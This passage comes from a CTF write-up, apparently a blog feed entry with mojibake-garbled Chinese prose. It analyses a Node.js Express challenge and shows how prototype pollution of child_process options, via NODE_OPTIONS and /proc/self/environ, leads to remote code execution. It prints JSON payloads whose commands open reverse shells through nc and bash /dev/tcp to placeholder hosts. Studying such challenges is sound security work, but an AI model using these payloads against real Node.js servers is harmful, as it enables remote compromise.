class="keyword">if</span> (err) &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">error</span>(<span class="string">&#x27;Error compressing file:&#x27;</span>, err);</span><br><span class="line">        <span class="keyword">return</span> res.<span class="title function_">status</span>(<span class="number">500</span>).<span class="title function_">send</span>(<span class="string">&#x27;Error compressing file&#x27;</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">const</span> base64Data = compressedData.<span class="title function_">toString</span>(<span class="string">&#x27;base64&#x27;</span>);</span><br><span class="line">      res.<span class="title function_">send</span>(base64Data);</span><br><span class="line">    &#125;);</span><br><span class="line">  &#125;);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">get</span>(<span class="string">&quot;/report&quot;</span>, verifyAdmin ,<span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">  res.<span class="title function_">sendFile</span>(__dirname + <span class="string">&quot;/static/report_noway_dirsearch.html&quot;</span>);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">post</span>(<span class="string">&quot;/report&quot;</span>, verifyAdmin ,<span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">const</span> &#123;user, date, reportmessage&#125; = req.<span class="property">body</span>;</span><br><span class="line">  <span class="keyword">if</span>(<span class="title class_">Reportcache</span>[user] === <span class="literal">undefined</span>) &#123;</span><br><span class="line">    <span class="title class_">Reportcache</span>[user] = &#123;&#125;;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="title class_">Reportcache</span>[user][date] = reportmessage</span><br><span class="line">  res.<span class="title function_">status</span>(<span class="number">200</span>).<span class="title function_">send</span>(<span class="string">&quot;&lt;script&gt;alert(&#x27;Report Success&#x27;);window.location.href=&#x27;/report&#x27;&lt;/script&gt;&quot;</span>);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">get</span>(<span class="string">&#x27;/countreport&#x27;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">let</span> count = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">const</span> user <span class="keyword">in</span> <span class="title class_">Reportcache</span>) &#123;</span><br><span class="line">    count += <span class="title class_">Object</span>.<span class="title function_">keys</span>(<span class="title class_">Reportcache</span>[user]).<span class="property">length</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  res.<span class="title function_">json</span>(&#123; count &#125;);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">//æŸ¥çœ‹å½“å‰è¿è¡Œç”¨æˆ·</span></span><br><span class="line">app.<span class="title function_">get</span>(<span class="string">&quot;/VanZY_s_T3st&quot;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">var</span> command = <span class="string">&#x27;whoami&#x27;</span>;</span><br><span class="line">  <span class="keyword">const</span> cmd = cp.<span class="title function_">spawn</span>(command ,[]);</span><br><span class="line">  cmd.<span class="property">stdout</span>.<span class="title function_">on</span>(<span class="string">&#x27;data&#x27;</span>, <span class="function">(<span class="params">data</span>) =&gt;</span> &#123;</span><br><span class="line">    res.<span class="title function_">status</span>(<span class="number">200</span>).<span class="title function_">end</span>(data.<span class="title function_">toString</span>());</span><br><span class="line">  &#125;);</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">listen</span>(<span class="number">3000</span>, <span class="function">() =&gt;</span> &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;Server running on http://localhost:3000&#x27;</span>);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>handle&#x2F;index.jsï¼š</p><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> ritm = <span class="built_in">require</span>(<span class="string">&#x27;require-in-the-middle&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> patchChildProcess = <span class="built_in">require</span>(<span class="string">&#x27;./child_process&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">new</span> ritm.<span class="title class_">Hook</span>(</span><br><span class="line">    [<span class="string">&#x27;child_process&#x27;</span>],</span><br><span class="line">    <span class="keyword">function</span> (<span class="params"><span class="variable language_">module</span>, name</span>) &#123;</span><br><span class="line">        <span class="keyword">switch</span> (name) &#123;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">&#x27;child_process&#x27;</span>: &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="title function_">patchChildProcess</span>(<span class="variable language_">module</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">);</span><br></pre></td></tr></table></figure><p>handle&#x2F;child_process.js</p><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">patchChildProcess</span>(<span class="params">cp</span>) &#123;</span><br><span class="line"></span><br><span class="line">    cp.<span class="property">execFile</span> = <span class="keyword">new</span> <span class="title class_">Proxy</span>(cp.<span class="property">execFile</span>, &#123; <span class="attr">apply</span>: <span class="title function_">patchOptions</span>(<span class="literal">true</span>) &#125;);</span><br><span class="line">    cp.<span class="property">fork</span> = <span class="keyword">new</span> <span class="title class_">Proxy</span>(cp.<span class="property">fork</span>, &#123; <span class="attr">apply</span>: <span class="title function_">patchOptions</span>(<span class="literal">true</span>) &#125;);</span><br><span class="line">    cp.<span class="property">spawn</span> = <span class="keyword">new</span> <span class="title class_">Proxy</span>(cp.<span class="property">spawn</span>, &#123; <span class="attr">apply</span>: <span class="title function_">patchOptions</span>(<span class="literal">true</span>) &#125;);</span><br><span class="line">    cp.<span class="property">execFileSync</span> = <span class="keyword">new</span> <span class="title class_">Proxy</span>(cp.<span class="property">execFileSync</span>, &#123; <span class="attr">apply</span>: <span class="title function_">patchOptions</span>(<span class="literal">true</span>) &#125;);</span><br><span class="line">    cp.<span class="property">execSync</span> = <span class="keyword">new</span> <span class="title class_">Proxy</span>(cp.<span class="property">execSync</span>, &#123; <span class="attr">apply</span>: <span class="title function_">patchOptions</span>() &#125;);</span><br><span class="line">    cp.<span class="property">spawnSync</span> = <span class="keyword">new</span> <span class="title class_">Proxy</span>(cp.<span class="property">spawnSync</span>, &#123; <span class="attr">apply</span>: <span class="title function_">patchOptions</span>(<span class="literal">true</span>) &#125;);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> cp;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">patchOptions</span>(<span class="params">hasArgs</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">function</span> <span class="title function_">apply</span>(<span class="params">target, thisArg, args</span>) &#123;</span><br><span class="line">        <span class="keyword">var</span> pos = <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">if</span> (pos === args.<span class="property">length</span>) &#123;</span><br><span class="line">            args[pos] = <span class="title function_">prototypelessSpawnOpts</span>();</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (pos &lt; args.<span class="property">length</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (hasArgs &amp;&amp; (<span class="title class_">Array</span>.<span class="title function_">isArray</span>(args[pos]) || args[pos] == <span class="literal">null</span>)) &#123;</span><br><span class="line">                pos++;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (<span class="keyword">typeof</span> args[pos] === <span class="string">&#x27;object&#x27;</span> &amp;&amp; args[pos] !== <span class="literal">null</span>) &#123;</span><br><span class="line">                args[pos] = <span class="title function_">prototypelessSpawnOpts</span>(args[pos]);</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (args[pos] == <span class="literal">null</span>) &#123;</span><br><span class="line">                args[pos] = <span class="title function_">prototypelessSpawnOpts</span>();</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="keyword">typeof</span> args[pos] === <span class="string">&#x27;function&#x27;</span>) &#123;</span><br><span class="line">                args.<span class="title function_">splice</span>(pos, <span class="number">0</span>, <span class="title function_">prototypelessSpawnOpts</span>());</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> target.<span class="title function_">apply</span>(thisArg, args);</span><br><span class="line">    &#125;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">prototypelessSpawnOpts</span>(<span class="params">obj</span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> prototypelessObj = <span class="title class_">Object</span>.<span class="title function_">assign</span>(<span class="title class_">Object</span>.<span class="title function_">create</span>(<span class="literal">null</span>), obj);</span><br><span class="line">    prototypelessObj.<span class="property">env</span> = <span class="title class_">Object</span>.<span class="title function_">assign</span>(<span class="title class_">Object</span>.<span class="title function_">create</span>(<span class="literal">null</span>), prototypelessObj.<span class="property">env</span> || process.<span class="property">env</span>);</span><br><span class="line">    <span class="keyword">return</span> prototypelessObj;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable language_">module</span>.<span class="property">exports</span> = patchChildProcess;</span><br></pre></td></tr></table></figure><p>åº”è¯¥æ˜¯åŸå‹é“¾æ±¡æŸ“äº†ï¼ŒåŸé¢˜åº”è¯¥å‡ºè‡ªï¼š</p><p><a href="https://xz.aliyun.com/t/6755?time__1311=n4+xnD0Dg7GQDtYbq05+bDynRDkYDcmxQw4YeID&u_atoken=a973634db876aa3f341051d13d508b03&u_asig=1a0c399a17277759720237598e0046#:~:text=child">https://xz.aliyun.com/t/6755?time__1311=n4%2BxnD0Dg7GQDtYbq05%2BbDynRDkYDcmxQw4YeID&amp;u_atoken=a973634db876aa3f341051d13d508b03&amp;u_asig=1a0c399a17277759720237598e0046#:~:text=child</a>_</p><p>æˆ‘ä»¬æ¥åˆ†æä¸€ä¸‹ä¸Šæ–‡æå‡ºçš„æ±¡æŸ“child_processåˆ°rce</p><p>child_processå†…ç½®äº†6ä¸ªæ–¹æ³•:execFileSyncã€execSyncã€forkã€execã€execFileã€spawn()</p><p>æœ€ç»ˆéƒ½æ˜¯è°ƒç”¨spawn()ï¼Œå…¶ä¸­spawn()çš„æœ¬è´¨æ˜¯åˆ›å»ºChildProcessçš„å®ä¾‹å¹¶è¿”å›ã€‚</p><h3 id="æ±¡æŸ“child-process-options"><a href="#æ±¡æŸ“child-process-options" class="headerlink" title="æ±¡æŸ“child_process options"></a>æ±¡æŸ“child_process options</h3><p>åœ¨spawnæ‰“ä¸Šæ–­ç‚¹</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> &#123; spawn &#125; = <span class="built_in">require</span>(<span class="string">&#x27;child_process&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="title function_">spawn</span>(<span class="string">&#x27;whoami&#x27;</span>).<span class="property">stdout</span>.<span class="title function_">on</span>(<span class="string">&#x27;data&#x27;</span>, <span class="function">(<span class="params">data</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`stdout: <span class="subst">$&#123;data&#125;</span>`</span>);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>spawnä¼šè°ƒç”¨normalizeSpawnArguments</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241001175545431.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241001175545431.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>æ³¨æ„åœ¨normalizeSpawnArgumentsä¸­ï¼Œå¦‚æœoptionsæœ‰envå±æ€§ï¼Œè¿™é‡Œenvä¸ºoptions.env</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241001175731386.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241001175731386.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>åé¢å°±æ˜¯å„ç§putï¼Œè¿”å›è¿™ä¸ªenvï¼Œæ­£å¸¸æ¥è¯´è¿™ä¸ªenvæ˜¯process.envï¼Œä¹Ÿå°±æ˜¯ç³»ç»Ÿç¯å¢ƒå˜é‡</p><p>å›åˆ°spawnï¼Œæ–°å»ºäº†å­è¿›ç¨‹ChildProcessï¼Œå¹¶è°ƒç”¨åŸç”Ÿspawn</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241001180433568.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241001180433568.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241001181001977.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241001181001977.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>åˆå› ä¸ºnodejs&gt;8.0æ—¶ï¼Œæ–°å¢åŠ äº†ä¸€ä¸ªå‘½ä»¤è¡Œå‚æ•°<code>NODE_OPTIONS</code>ï¼Œæ‰§è¡Œjsè„šæœ¬çš„æ—¶å€™ç”¨ä»¥ä¸‹å‚æ•°æŒ‡å®šå¦å¤–ä¸€ä¸ªjsè¿›è¡ŒåŒ…å«ï¼ŒåŒ…å«å˜›ï¼Œä¹Ÿä¼šæ‰§è¡Œä»£ç </p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">NODE_OPTIONS=&#x27;--require ./evil.js&#x27; node</span><br></pre></td></tr></table></figure><p>nodeè¿›ç¨‹å¯åŠ¨æ—¶ï¼Œä¼šé»˜è®¤é™„å¸¦ç¯å¢ƒå˜é‡ä½œä¸ºå‘½ä»¤è¡Œå‚æ•°ï¼Œå¦‚æœç¯å¢ƒå˜é‡é‡Œæœ‰<code>NODE_OPTIONS</code>å‚æ•°ï¼Œä¹Ÿä¼šé»˜è®¤æ‰§è¡Œã€‚nodeå­è¿›ç¨‹ä¹Ÿå¦‚æ­¤ã€‚</p><blockquote><p>nodeè¿è¡Œæ—¶ä¼šæŠŠå½“å‰è¿›ç¨‹çš„envå†™è¿›ç³»ç»Ÿçš„ç¯å¢ƒå˜é‡ï¼Œå­è¿›ç¨‹ä¹Ÿä¸€æ ·ï¼Œåœ¨linuxä¸­å­˜å‚¨ä¸º<code>/proc/self/environ</code>ã€‚</p></blockquote><p>å¦‚æœæˆ‘ä»¬èƒ½è¦†ç›–options.envï¼Œä½¿envçš„å€¼ä¸ºæ¶æ„jsä»£ç ï¼Œè¿™æ ·nodeè¿è¡Œæ—¶ä¼šæŠŠå½“å‰æ¶æ„ä»£ç å†™å…¥<code>/proc/self/environ</code></p><p>å†å‘envå†™å…¥<code>NODE_OPTIONS</code>å‚æ•°ï¼Œå‚æ•°å€¼ä¸º<code>--require /proc/self/environ</code>ï¼Œå°±èƒ½RCE</p><p>optionsæ˜¯Obejectï¼Œç›´æ¥æ±¡æŸ“Object.envå°±OK</p><p>è€Œä¸”fileå¿…é¡»ä¸ºnodeï¼Œå¦åˆ™æ— æ³•å°†NODE_OPTIONSè½½å…¥</p><p>execã€execFileå‡½æ•°æ— è®ºä¼ å…¥ä»€ä¹ˆå‘½ä»¤ï¼Œfileçš„å€¼éƒ½ä¼šä¸º<code>/bin/sh</code>ï¼Œæ‰€ä»¥é»˜è®¤ä¸èƒ½ç”¨è¿™ç§åŠæ³•æ‰“</p><p>ä¸€èˆ¬æ¥è¯´payloadé•¿è¿™æ ·ï¼š</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;constructor.prototype.shell&quot;</span><span class="punctuation">:</span><span class="string">&quot;node&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;constructor.prototype.env.AnyString&quot;</span><span class="punctuation">:</span> <span class="string">&quot;require(&#x27;child_process&#x27;).execSync(&#x27;nc ip port -e /bin/bash&#x27;);process.exit();//&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;constructor.prototype.env.NODE_OPTIONS&quot;</span><span class="punctuation">:</span><span class="string">&quot;-r /proc/self/environ&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p>ä¸‹é¢å°±æ˜¯ç»•è¿‡è¿‡æ»¤äº†</p><h3 id="ç»•è¿‡"><a href="#ç»•è¿‡" class="headerlink" title="ç»•è¿‡"></a>ç»•è¿‡</h3><p>child_process.jså¯¼å…¥äº†ç¯å¢ƒå˜é‡</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241001183303007.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241001183303007.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>å°±åƒæˆ‘ä»¬ä¸Šé¢æåˆ°çš„ï¼Œç¯å¢ƒå˜é‡ä¼šè¢«å†™å…¥æ–‡ä»¶ï¼Œæ¯æ¬¡è¿›ç¨‹è¿è¡Œæ—¶ä¼šè‡ªåŠ¨è°ƒç”¨ã€‚ä¹Ÿå°±æ˜¯æˆ‘ä»¬æ¯æ¬¡è°ƒç”¨execFile,forkç­‰ä»¥ä¸‹å…­ç§ä»£ç æ‰§è¡Œçš„å‡½æ•°æ—¶éƒ½ä¼šåˆ›å»ºä¸€ä¸ªä»£ç†ï¼Œä»£ç†å¯¹è±¡ç”¨patchOptionså¤„ç†</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241001183405742.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241001183405742.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>è¯»ä¸€ä¸‹patchOptionså‡½æ•°ã€‚å‚æ•°é•¿åº¦ä¸º1è°ƒç”¨prototypelessSpawnOptè¿”å›ä¸€ä¸ªæ— åŸå‹Object</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">patchOptions</span>(<span class="params">hasArgs</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">function</span> <span class="title function_">apply</span>(<span class="params">target, thisArg, args</span>) &#123;</span><br><span class="line">        <span class="keyword">var</span> pos = <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">if</span> (pos === args.<span class="property">length</span>) &#123;</span><br><span class="line">            args[pos] = <span class="title function_">prototypelessSpawnOpts</span>();</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (pos &lt; args.<span class="property">length</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (hasArgs &amp;&amp; (<span class="title class_">Array</span>.<span class="title function_">isArray</span>(args[pos]) || args[pos] == <span class="literal">null</span>)) &#123;</span><br><span class="line">                pos++;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (<span class="keyword">typeof</span> args[pos] === <span class="string">&#x27;object&#x27;</span> &amp;&amp; args[pos] !== <span class="literal">null</span>) &#123;</span><br><span class="line">                args[pos] = <span class="title function_">prototypelessSpawnOpts</span>(args[pos]);</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (args[pos] == <span class="literal">null</span>) &#123;</span><br><span class="line">                args[pos] = <span class="title function_">prototypelessSpawnOpts</span>();</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="keyword">typeof</span> args[pos] === <span class="string">&#x27;function&#x27;</span>) &#123;</span><br><span class="line">                args.<span class="title function_">splice</span>(pos, <span class="number">0</span>, <span class="title function_">prototypelessSpawnOpts</span>());</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> target.<span class="title function_">apply</span>(thisArg, args);</span><br><span class="line">    &#125;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241001183726421.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241001183726421.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>prototypelessSpawnOptsçœŸçš„è¿”å›çš„æ˜¯æ— åŸå‹çš„Objectå—ï¼Œé‚£å‚æ•°objæ‹¿æ¥å¹²å˜›çš„ï¼Ÿ</p><p>æŠ„gptçš„ä»£ç è§£é‡Šï¼š</p><blockquote><p>åˆ›å»ºä¸€ä¸ªæ²¡æœ‰åŸå‹çš„ç©ºå¯¹è±¡ï¼Œå¹¶å°†ä¼ å…¥çš„å¯¹è±¡objçš„å±æ€§å¤åˆ¶åˆ°æ–°å¯¹è±¡ä¸Šã€‚<br>å¦‚æœobjæœ‰envå±æ€§ï¼Œåˆ™åˆ›å»ºä¸€ä¸ªæ²¡æœ‰åŸå‹çš„æ–°ç¯å¢ƒå¯¹è±¡ï¼Œå¹¶å°†envå±æ€§å€¼å¤åˆ¶è¿‡æ¥ï¼›å¦åˆ™ï¼Œåˆ›å»ºä¸€ä¸ªæ²¡æœ‰åŸå‹çš„æ–°ç¯å¢ƒå¯¹è±¡ï¼Œå¹¶å°†process.envçš„å€¼å¤åˆ¶è¿‡æ¥</p></blockquote><p>å•Šå“ˆï¼Œå®Œå…¨æ˜¯èƒ½ç”¨envï¼Œå‰ææ˜¯è¦æœ‰objå‚æ•°ä¼ è¿›ã€‚é‚£å®šä½åˆ°ä¸Šé¢çœ‹å“ªé‡Œèƒ½ä¼ å‚æ•°ã€‚</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241001190102386.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241001190102386.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>lengthå½“ç„¶ä¸èƒ½ç­‰äº1</p><p>length&gt;1æ—¶ï¼ŒhasArgsä¸ºçœŸï¼Œç¬¬ä¸€ä¸ªå‚æ•°ä¸ºç©ºæˆ–è€…ç¬¬ä¸€ä¸ªå‚æ•°ä¸ºæ•°ç»„æ—¶ï¼Œè¿›å…¥ç¬¬äºŒä¸ªif</p><p>åˆ¤æ–­ç¬¬äºŒä¸ªå‚æ•°æ˜¯å¦ä¸ºObjectä¸”ä¸ä¸ºç©º</p><p>è¦æƒ³æœ‰ç¬¬ä¸€ä¸ªå‚æ•°è€Œæ²¡æœ‰ç¬¬äºŒä¸ªå‚æ•°ç¡®å®éš¾æï¼Œä½†æ±¡æŸ“å±æ€§<code>2</code>ï¼ŒObject.2å°±ä¼šä¼ é€’è¿›å»</p><p>å†çœ‹çœ‹åœ¨å“ªä¼ å‚</p><p>åœ¨&#x2F;reportè·¯ç”±ä¸‹</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241001184907533.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241001184907533.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>Reportcacheæ˜¯ä¸ªå¯¹è±¡</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241001185054216.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241001185054216.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p><code>Reportcache[__proto__][key]</code>&#x3D;&#x3D;<code>Object.__proto__.value</code></p><p>å¸¦ä¸Šèº«ä»½POST payload</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line"><span class="attr">&quot;user&quot;</span><span class="punctuation">:</span><span class="string">&quot;__proto__&quot;</span><span class="punctuation">,</span></span><br><span class="line"><span class="attr">&quot;date&quot;</span><span class="punctuation">:</span><span class="number">2</span><span class="punctuation">,</span></span><br><span class="line"><span class="attr">&quot;reportmessage&quot;</span><span class="punctuation">:</span> </span><br><span class="line">    <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;shell&quot;</span><span class="punctuation">:</span><span class="string">&quot;/readflag&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;env&quot;</span><span class="punctuation">:</span> </span><br><span class="line">        <span class="punctuation">&#123;</span></span><br><span class="line">            <span class="attr">&quot;NODE_DEBUG&quot;</span><span class="punctuation">:</span> <span class="string">&quot;require(\&quot;child_process\&quot;).exec(\&quot;bash -c &#x27;bash -i &gt;&amp; /dev/tcp/ip/port 0&gt;&amp;1&#x27;\&quot;);process.exit()//&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;NODE_OPTIONS&quot;</span><span class="punctuation">:</span> <span class="string">&quot;--require /proc/self/environ&quot;</span></span><br><span class="line">        <span class="punctuation">&#125;</span></span><br><span class="line">    <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p>ç„¶åè¯·æ±‚&#x2F;VanZY_s_T3stè·¯ç”±è§¦å‘</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241001173945183.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241001173945183.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>]]></content>
      
      
      <categories>
          
          <category> nodejs </category>
          
      </categories>
      
      
        <tags>
            
            <tag> nodejs </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>nodejsæ¼æ´</title>
      <link href="/2024/09/30/nodejs-lou-dong/"/>
      <url>/2024/09/30/nodejs-lou-dong/</url>
      
